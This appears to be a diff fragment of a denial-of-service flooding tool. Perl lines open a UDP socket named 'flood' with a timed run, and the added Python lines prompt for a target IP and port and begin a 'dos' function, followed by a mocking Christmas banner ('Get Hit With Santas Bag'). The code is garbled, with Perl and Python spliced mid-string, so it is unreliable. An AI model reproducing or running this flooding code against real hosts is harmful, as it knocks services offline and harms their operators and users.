@@ -14,7 +14,13 @@ $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 print " port " . ($port ? $port : "random") . " " .
-  ($size ? "$size-byte" : "") . "                                                           
+  ($size ? "$size-byte" : "") . "   
+
+host = raw_input("IP Target : ")
+ip = host
+port = input("Port      : ")
+port = port
+def dos():                                              
  
  ×HoHoHo Merry Chrismas×
     Get Hit With Santas Bag           
